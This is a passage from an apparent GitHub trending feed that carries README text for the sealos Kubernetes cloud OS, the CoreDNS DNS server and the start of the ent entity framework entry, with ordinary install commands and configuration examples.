- Anything you need including storage / network / HA database / message queue / monitoring can be retrieved with a click of the mouse, or simply &lt;code&gt;sealos run&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Vision of sealos&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Any organization can use the cloud OS based on Kubernetes as easily as using macOS&lt;/li&gt; &#xA; &lt;li&gt;Anyone can build complex cloud services with a click of the mouse or a single command&lt;/li&gt; &#xA; &lt;li&gt;Any organization can maintain the entire cloud system with an intern&lt;/li&gt; &#xA; &lt;li&gt;Any organization can have a more open AWS, and public cloud and private cloud can provide the same experience&lt;/li&gt; &#xA; &lt;li&gt;Any distributed software can run in the system with a single click and self-operate.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What can sealos do&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Manage clusters lifecycle, quickly install HA Kubernetes clusters, add / remove nodes, clean the cluster, auto recovering, etc.&lt;/li&gt; &#xA; &lt;li&gt;Download and use OCI-compatible distributed software like openebs, minio, ingress, pgsql, mysql, redis, etc. from sealos hub.&lt;/li&gt; &#xA; &lt;li&gt;Manage an entire cluster and the distributed applications running on it just like using macOS with sealos desktop.&lt;/li&gt; &#xA; &lt;li&gt;sealos can manage Kubernetes, but is not only a Kubernetes manager. It is an abstract cloud OS that can manage Kubernetes through downloading an managing application.&lt;/li&gt; &#xA; &lt;li&gt;sealos can install Kubernetes, but is not only a Kubernetes installer. Installing Kubernetes is only a basic capability of sealos.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Who should use sealos&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Beginners - Even beginners that know nothing about Kubernetes can use sealos painlessly through command line or GUI to obtain the software needed, like establishing a HA database with a single mouse click.&lt;/li&gt; &#xA; &lt;li&gt;SaaS application developer - Use a single command to retrieve the service you need, like a database, an HA message queue or a developing environment, without any knowledge of low-level details.&lt;/li&gt; &#xA; &lt;li&gt;Cluster manager - sealos marketplace offers a wide range of managing applications like lens official dashboard, web terminal, and cloud native monitoring systems.&lt;/li&gt; &#xA; &lt;li&gt;Cloud OS developer - You may develop sealos applications and submit them to sealos hub for others to use.&lt;/li&gt; &#xA; &lt;li&gt;Private cloud delivery operator - sealos cluster image ensures high consistency in offline environment and great encapsulation for SaaS applications, significantly easing the private cloud delivery process.&lt;/li&gt; &#xA; &lt;li&gt;Organizations - You may use sealos public cloud directly, or start an identical private cloud in your own data center. You can even run sealos on the IaaS of public cloud vendor and no longer suffer from vendor lock-in.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Why is sealos different&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Kubernetes is a means, not an end&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;For general users, the most important thing is what&#39;s running on Kubernetes, rather than Kubernetes itself. With sealos, users do not need to care about Kubernetes.&lt;/p&gt; &#xA;&lt;p&gt;Meanwhile, for those who are familiar with Kubernetes, sealos also provides smooth experience.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Different forms for different applications&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;The simplest version of sealos barely contains anything beyond capabilities related to cluster image. It only has a Kubernetes inside and other capabilities come from the applications installed, which makes sealos simple and powerful both for personal use and for serving public cloud under large-scale multi-tenant scenarios.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Compatibility&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Any preferences can be fulfilled on sealos. Take CI/CD as an example, some may like drone while others prefer argo, and they just need to install different applications. No CI/CD tools will be deeply integrated with sealos and users choose to install/uninstall them freely.&lt;/p&gt; &#xA;&lt;p&gt;sealos will not pursue styles consistency of distributed applications, just like styles of Office and email client won&#39;t be the same. Otherwise, great effort need to be put into making them consistent and replacing an application will be very costly.&lt;/p&gt; &#xA;&lt;p&gt;Also, sealos will not require the account information for different applications to be the same, as account management is usually specifically tuned to the application.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Different usage for different users&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;In macOS, general users use GUI, developers type in commands in the terminal, and system application developers call system APIs. Similarly, in sealos, general users use GUI, cloud native practitioners use kubectl and interact with dashboard and apiserver, and developers develop Kubernetes operator directly.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Simple and powerful&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;sealos provides the most basic framework and the capabilities all come from higher-level applications. The duty of sealos is to manage these applications, so the complexity of the system will not increase with more features.&lt;/p&gt; &#xA;&lt;h2&gt;sealos in practise&lt;/h2&gt; &#xA;&lt;p&gt;Boss: &#34;We need to keep up with the pace and build a cloud platform based on Kubernetes, with support for storage, PaaS, CI/CD, cloud developing, database, ... What&#39;s the estimated cost?&#34;&lt;/p&gt; &#xA;&lt;p&gt;CTO: &#34;3 for Kubernetes, 1 storage expert, 1 developer, 3 for PaaS, 3 for CI/CD, 5 for cloud developing, 3 for operation and maintenance... I think 15 people and half a year is sufficient.&#34;&lt;/p&gt; &#xA;&lt;p&gt;Everyone is talking, and a voice comes from the corner:&lt;/p&gt; &#xA;&lt;p&gt;&#34;I know an open-source software that can handle this with a single command:&#34;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ sealos run kubernetes:v1.24.0 openebs:v1.9.0 mysql:v8.0 minio:v4.4.16 ingress:v4.1.0 laf:v0.8.0&#xA;       -m 192.168.0.2 -n 192.168.0.3 -p 123456&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And the task is completed before the meeting ends.&lt;/p&gt; &#xA;&lt;h2&gt;Quickstart&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Installing an HA kubernetes cluster with calico as CNI&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Here &lt;code&gt;kubernetes:1.24.0&lt;/code&gt; and &lt;code&gt;calico:v3.22.1&lt;/code&gt; are the cluster images in the registry which are fully compatible with OCI standard. Wonder if we can use flannel instead? Of course!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;# Download and install sealos. sealos is a golang binary so you can just download and copy to bin. You may also download it from release page.&#xA;$ wget -c https://sealyun-home.oss-cn-beijing.aliyuncs.com/sealos-4.0/latest/sealos-amd64 -O sealos &amp;amp;&amp;amp; \&#xA;    chmod +x sealos &amp;amp;&amp;amp; mv sealos /usr/bin&#xA;# Create a cluster&#xA;$ sealos run kubernetes:1.24.0 calico:v3.22.1 \&#xA;     --masters 192.168.64.2,192.168.64.22,192.168.64.20 \&#xA;     --nodes 192.168.64.21,192.168.64.19 -p [your-ssh-passwd]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Building a custom cluster image&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/labring/sealos/raw/main/docs/4.0/build-example-ingress-helm.md&#34;&gt;Building an ingress cluster image&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Storage, message queue, database, etc.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Don&#39;t be shocked by the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ sealos run fanux/helm:v3.8.1 # install helm&#xA;$ sealos run fanux/openebs:v1.9.0 # install openebs&#xA;$ sealos run fanux/minio-operator:v4.4.16 fanux/ingress-nginx:4.1.0-daemonset \&#xA;   fanux/mysql-operator:v8.0.23-14.1 fanux/redis-operator:5.0 # oneliner&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And now everything is ready.&lt;/p&gt; &#xA;&lt;h2&gt;Links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/labring/sealos/tree/release-v3.3.9#readme&#34;&gt;sealos 3.0(older version)&lt;/a&gt; For older version users. Note that sealos 4.0 includes significant improvements, so please upgrade ASAP.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/containers/buildah&#34;&gt;buildah&lt;/a&gt; Capabilities of buildah is widely used in sealos 4.0 to make cluster images compatible with container images and docker registry.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>coredns/coredns</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/coredns/coredns</id>
    <link href="https://github.com/coredns/coredns" rel="alternate"></link>
    <summary type="html">&lt;p&gt;CoreDNS is a DNS server that chains plugins&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://coredns.io&#34;&gt;&lt;img src=&#34;https://coredns.io/images/CoreDNS_Colour_Horizontal.png&#34; alt=&#34;CoreDNS&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://godoc.org/github.com/coredns/coredns&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/godoc-reference-blue.svg?sanitize=true&#34; alt=&#34;Documentation&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://github.com/coredns/coredns/actions/workflows/codeql-analysis.yml/badge.svg?sanitize=true&#34; alt=&#34;CodeQL&#34;&gt; &lt;img src=&#34;https://github.com/coredns/coredns/actions/workflows/go.fmt.yml/badge.svg?sanitize=true&#34; alt=&#34;Go Fmt&#34;&gt; &lt;img src=&#34;https://github.com/coredns/coredns/actions/workflows/go.test.yml/badge.svg?sanitize=true&#34; alt=&#34;Go Tests&#34;&gt; &lt;img src=&#34;https://github.com/coredns/coredns/actions/workflows/go.tidy.yml/badge.svg?sanitize=true&#34; alt=&#34;Go Tidy&#34;&gt; &lt;a href=&#34;https://circleci.com/gh/coredns/coredns&#34;&gt;&lt;img src=&#34;https://circleci.com/gh/coredns/coredns.svg?style=shield&#34; alt=&#34;CircleCI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/github/coredns/coredns?branch=master&#34;&gt;&lt;img src=&#34;https://img.shields.io/codecov/c/github/coredns/coredns/master.svg?sanitize=true&#34; alt=&#34;Code Coverage&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/coredns/coredns&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/coredns/coredns.svg?sanitize=true&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/coredns/coredns&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/coredns/coredns&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/1250&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/1250/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;CoreDNS is a DNS server/forwarder, written in Go, that chains &lt;a href=&#34;https://coredns.io/plugins&#34;&gt;plugins&lt;/a&gt;. Each plugin performs a (DNS) function.&lt;/p&gt; &#xA;&lt;p&gt;CoreDNS is a &lt;a href=&#34;https://cncf.io&#34;&gt;Cloud Native Computing Foundation&lt;/a&gt; graduated project.&lt;/p&gt; &#xA;&lt;p&gt;CoreDNS is a fast and flexible DNS server. The key word here is &lt;em&gt;flexible&lt;/em&gt;: with CoreDNS you are able to do what you want with your DNS data by utilizing plugins. If some functionality is not provided out of the box you can add it by &lt;a href=&#34;https://coredns.io/explugins&#34;&gt;writing a plugin&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;CoreDNS can listen for DNS requests coming in over UDP/TCP (go&#39;old DNS), TLS (&lt;a href=&#34;https://tools.ietf.org/html/rfc7858&#34;&gt;RFC 7858&lt;/a&gt;), also called DoT, DNS over HTTP/2 - DoH - (&lt;a href=&#34;https://tools.ietf.org/html/rfc8484&#34;&gt;RFC 8484&lt;/a&gt;) and &lt;a href=&#34;https://grpc.io&#34;&gt;gRPC&lt;/a&gt; (not a standard).&lt;/p&gt; &#xA;&lt;p&gt;Currently CoreDNS is able to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Serve zone data from a file; both DNSSEC (NSEC only) and DNS are supported (&lt;em&gt;file&lt;/em&gt; and &lt;em&gt;auto&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Retrieve zone data from primaries, i.e., act as a secondary server (AXFR only) (&lt;em&gt;secondary&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Sign zone data on-the-fly (&lt;em&gt;dnssec&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Load balancing of responses (&lt;em&gt;loadbalance&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Allow for zone transfers, i.e., act as a primary server (&lt;em&gt;file&lt;/em&gt; + &lt;em&gt;transfer&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Automatically load zone files from disk (&lt;em&gt;auto&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Caching of DNS responses (&lt;em&gt;cache&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Use etcd as a backend (replacing &lt;a href=&#34;https://github.com/skynetservices/skydns&#34;&gt;SkyDNS&lt;/a&gt;) (&lt;em&gt;etcd&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Use k8s (kubernetes) as a backend (&lt;em&gt;kubernetes&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Serve as a proxy to forward queries to some other (recursive) nameserver (&lt;em&gt;forward&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Provide metrics (by using Prometheus) (&lt;em&gt;prometheus&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Provide query (&lt;em&gt;log&lt;/em&gt;) and error (&lt;em&gt;errors&lt;/em&gt;) logging.&lt;/li&gt; &#xA; &lt;li&gt;Integrate with cloud providers (&lt;em&gt;route53&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Support the CH class: &lt;code&gt;version.bind&lt;/code&gt; and friends (&lt;em&gt;chaos&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Support the RFC 5001 DNS name server identifier (NSID) option (&lt;em&gt;nsid&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Profiling support (&lt;em&gt;pprof&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Rewrite queries (qtype, qclass and qname) (&lt;em&gt;rewrite&lt;/em&gt; and &lt;em&gt;template&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Block ANY queries (&lt;em&gt;any&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Provide DNS64 IPv6 Translation (&lt;em&gt;dns64&lt;/em&gt;).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;And more. Each of the plugins is documented. See &lt;a href=&#34;https://coredns.io/plugins&#34;&gt;coredns.io/plugins&lt;/a&gt; for all in-tree plugins, and &lt;a href=&#34;https://coredns.io/explugins&#34;&gt;coredns.io/explugins&lt;/a&gt; for all out-of-tree plugins.&lt;/p&gt; &#xA;&lt;h2&gt;Compilation from Source&lt;/h2&gt; &#xA;&lt;p&gt;To compile CoreDNS, we assume you have a working Go setup. See various tutorials if you don’t have that already configured.&lt;/p&gt; &#xA;&lt;p&gt;First, make sure your golang version is 1.17 or higher as &lt;code&gt;go mod&lt;/code&gt; support and other api is needed. See &lt;a href=&#34;https://github.com/golang/go/wiki/Modules&#34;&gt;here&lt;/a&gt; for &lt;code&gt;go mod&lt;/code&gt; details. Then, check out the project and run &lt;code&gt;make&lt;/code&gt; to compile the binary:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/coredns/coredns&#xA;$ cd coredns&#xA;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This should yield a &lt;code&gt;coredns&lt;/code&gt; binary.&lt;/p&gt; &#xA;&lt;h2&gt;Compilation with Docker&lt;/h2&gt; &#xA;&lt;p&gt;CoreDNS requires Go to compile. However, if you already have docker installed and prefer not to setup a Go environment, you could build CoreDNS easily:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ docker run --rm -i -t -v $PWD:/v -w /v golang:1.17 make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above command alone will have &lt;code&gt;coredns&lt;/code&gt; binary generated.&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;When starting CoreDNS without any configuration, it loads the &lt;a href=&#34;https://coredns.io/plugins/whoami&#34;&gt;&lt;em&gt;whoami&lt;/em&gt;&lt;/a&gt; and &lt;a href=&#34;https://coredns.io/plugins/log&#34;&gt;&lt;em&gt;log&lt;/em&gt;&lt;/a&gt; plugins and starts listening on port 53 (override with &lt;code&gt;-dns.port&lt;/code&gt;), it should show the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;.:53&#xA;CoreDNS-1.6.6&#xA;linux/amd64, go1.16.10, aa8c32&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The following could be used to query the CoreDNS server that is running now:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;dig @127.0.0.1 -p 53 www.example.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Any query sent to port 53 should return some information; your sending address, port and protocol used. The query should also be logged to standard output.&lt;/p&gt; &#xA;&lt;p&gt;The configuration of CoreDNS is done through a file named &lt;code&gt;Corefile&lt;/code&gt;. When CoreDNS starts, it will look for the &lt;code&gt;Corefile&lt;/code&gt; from the current working directory. A &lt;code&gt;Corefile&lt;/code&gt; for CoreDNS server that listens on port &lt;code&gt;53&lt;/code&gt; and enables &lt;code&gt;whoami&lt;/code&gt; plugin is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;.:53 {&#xA;    whoami&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Sometimes port number 53 is occupied by system processes. In that case you can start the CoreDNS server while modifying the &lt;code&gt;Corefile&lt;/code&gt; as given below so that the CoreDNS server starts on port 1053.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;.:1053 {&#xA;    whoami&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you have a &lt;code&gt;Corefile&lt;/code&gt; without a port number specified it will, by default, use port 53, but you can override the port with the &lt;code&gt;-dns.port&lt;/code&gt; flag: &lt;code&gt;coredns -dns.port 1053&lt;/code&gt;, runs the server on port 1053.&lt;/p&gt; &#xA;&lt;p&gt;You may import other text files into the &lt;code&gt;Corefile&lt;/code&gt; using the &lt;em&gt;import&lt;/em&gt; directive. You can use globs to match multiple files with a single &lt;em&gt;import&lt;/em&gt; directive.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;.:53 {&#xA;    import example1.txt&#xA;}&#xA;import example2.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use environment variables in the &lt;code&gt;Corefile&lt;/code&gt; with &lt;code&gt;{$VARIABLE}&lt;/code&gt;. Note that each environment variable is inserted into the &lt;code&gt;Corefile&lt;/code&gt; as a single token. For example, an environment variable with a space in it will be treated as a single token, not as two separate tokens.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;.:53 {&#xA;    {$ENV_VAR}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A Corefile for a CoreDNS server that forward any queries to an upstream DNS (e.g., &lt;code&gt;8.8.8.8&lt;/code&gt;) is as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;.:53 {&#xA;    forward . 8.8.8.8:53&#xA;    log&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start CoreDNS and then query on that port (53). The query should be forwarded to 8.8.8.8 and the response will be returned. Each query should also show up in the log which is printed on standard output.&lt;/p&gt; &#xA;&lt;p&gt;To serve the (NSEC) DNSSEC-signed &lt;code&gt;example.org&lt;/code&gt; on port 1053, with errors and logging sent to standard output. Allow zone transfers to everybody, but specifically mention 1 IP address so that CoreDNS can send notifies to it.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;example.org:1053 {&#xA;    file /var/lib/coredns/example.org.signed&#xA;    transfer {&#xA;        to * 2001:500:8f::53&#xA;    }&#xA;    errors&#xA;    log&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Serve &lt;code&gt;example.org&lt;/code&gt; on port 1053, but forward everything that does &lt;em&gt;not&lt;/em&gt; match &lt;code&gt;example.org&lt;/code&gt; to a recursive nameserver &lt;em&gt;and&lt;/em&gt; rewrite ANY queries to HINFO.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;example.org:1053 {&#xA;    file /var/lib/coredns/example.org.signed&#xA;    transfer {&#xA;        to * 2001:500:8f::53&#xA;    }&#xA;    errors&#xA;    log&#xA;}&#xA;&#xA;. {&#xA;    any&#xA;    forward . 8.8.8.8:53&#xA;    errors&#xA;    log&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;IP addresses are also allowed. They are automatically converted to reverse zones:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;10.0.0.0/24 {&#xA;    whoami&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Means you are authoritative for &lt;code&gt;0.0.10.in-addr.arpa.&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This also works for IPv6 addresses. If for some reason you want to serve a zone named &lt;code&gt;10.0.0.0/24&lt;/code&gt; add the closing dot: &lt;code&gt;10.0.0.0/24.&lt;/code&gt; as this also stops the conversion.&lt;/p&gt; &#xA;&lt;p&gt;This even works for CIDR (See RFC 1518 and 1519) addressing, i.e. &lt;code&gt;10.0.0.0/25&lt;/code&gt;, CoreDNS will then check if the &lt;code&gt;in-addr&lt;/code&gt; request falls in the correct range.&lt;/p&gt; &#xA;&lt;p&gt;Listening on TLS (DoT) and for gRPC? Use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;tls://example.org grpc://example.org {&#xA;    whoami&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And for DNS over HTTP/2 (DoH) use:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;https://example.org {&#xA;    whoami&#xA;    tls mycert mykey&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;in this setup, the CoreDNS will be responsible for TLS termination&lt;/p&gt; &#xA;&lt;p&gt;you can also start DNS server serving DoH without TLS termination (plain HTTP), but beware that in such scenario there has to be some kind of TLS termination proxy before CoreDNS instance, which forwards DNS requests otherwise clients will not be able to communicate via DoH with the server&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-corefile&#34;&gt;https://example.org {&#xA;    whoami&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Specifying ports works in the same way:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;grpc://example.org:1443 https://example.org:1444 {&#xA;    # ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When no transport protocol is specified the default &lt;code&gt;dns://&lt;/code&gt; is assumed.&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;re most active on Github (and Slack):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Github: &lt;a href=&#34;https://github.com/coredns/coredns&#34;&gt;https://github.com/coredns/coredns&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Slack: #coredns on &lt;a href=&#34;https://slack.cncf.io&#34;&gt;https://slack.cncf.io&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;More resources can be found:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Website: &lt;a href=&#34;https://coredns.io&#34;&gt;https://coredns.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Blog: &lt;a href=&#34;https://blog.coredns.io&#34;&gt;https://blog.coredns.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Twitter: &lt;a href=&#34;https://twitter.com/corednsio&#34;&gt;@corednsio&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Mailing list/group: &lt;a href=&#34;mailto:coredns-discuss@googlegroups.com&#34;&gt;coredns-discuss@googlegroups.com&lt;/a&gt; (not very active)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contribution guidelines&lt;/h2&gt; &#xA;&lt;p&gt;If you want to contribute to CoreDNS, be sure to review the &lt;a href=&#34;https://raw.githubusercontent.com/coredns/coredns/master/CONTRIBUTING.md&#34;&gt;contribution guidelines&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Deployment&lt;/h2&gt; &#xA;&lt;p&gt;Examples for deployment via systemd and other use cases can be found in the &lt;a href=&#34;https://github.com/coredns/deployment&#34;&gt;deployment repository&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Deprecation Policy&lt;/h2&gt; &#xA;&lt;p&gt;When there is a backwards incompatible change in CoreDNS the following process is followed:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Release x.y.z: Announce that in the next release we will make backward incompatible changes.&lt;/li&gt; &#xA; &lt;li&gt;Release x.y+1.0: Increase the minor version and set the patch version to 0. Make the changes, but allow the old configuration to be parsed. I.e. CoreDNS will start from an unchanged Corefile.&lt;/li&gt; &#xA; &lt;li&gt;Release x.y+1.1: Increase the patch version to 1. Remove the lenient parsing, so CoreDNS will not start if those features are still used.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;E.g. 1.3.1 announce a change. 1.4.0 a new release with the change but backward compatible config. And finally 1.4.1 that removes the config workarounds.&lt;/p&gt; &#xA;&lt;h2&gt;Security&lt;/h2&gt; &#xA;&lt;h3&gt;Security Audits&lt;/h3&gt; &#xA;&lt;p&gt;Third party security audits have been performed by:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cure53.de&#34;&gt;Cure53&lt;/a&gt; in March 2018. &lt;a href=&#34;https://coredns.io/assets/DNS-01-report.pdf&#34;&gt;Full Report&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.trailofbits.com&#34;&gt;Trail of Bits&lt;/a&gt; in March 2022. &lt;a href=&#34;https://github.com/trailofbits/publications/raw/master/reviews/CoreDNS.pdf&#34;&gt;Full Report&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Reporting security vulnerabilities&lt;/h3&gt; &#xA;&lt;p&gt;If you find a security vulnerability or any security related issues, please DO NOT file a public issue, instead send your report privately to &lt;code&gt;security@coredns.io&lt;/code&gt;. Security reports are greatly appreciated and we will publicly thank you for it.&lt;/p&gt; &#xA;&lt;p&gt;Please consult &lt;a href=&#34;https://github.com/coredns/coredns/raw/master/SECURITY.md&#34;&gt;security vulnerability disclosures and security fix and release process document&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ent/ent</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/ent/ent</id>
    <link href="https://github.com/ent/ent" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An entity framework for Go&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;ent - An Entity Framework For Go&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/entgo_io&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/url/https/twitter.com/entgo_io.svg?style=social&amp;amp;label=Follow%20%40entgo_io&#34; alt=&#34;Twitter&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://discord.gg/qZmPgTE6RX&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/885059418646003782?label=discord&amp;amp;logo=discord&amp;amp;style=flat-square&amp;amp;logoColor=white&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/README.md&#34;&gt;English&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/README_zh.md&#34;&gt;中文&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/ent/ent/master/README_jp.md&#34;&gt;日本語&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img 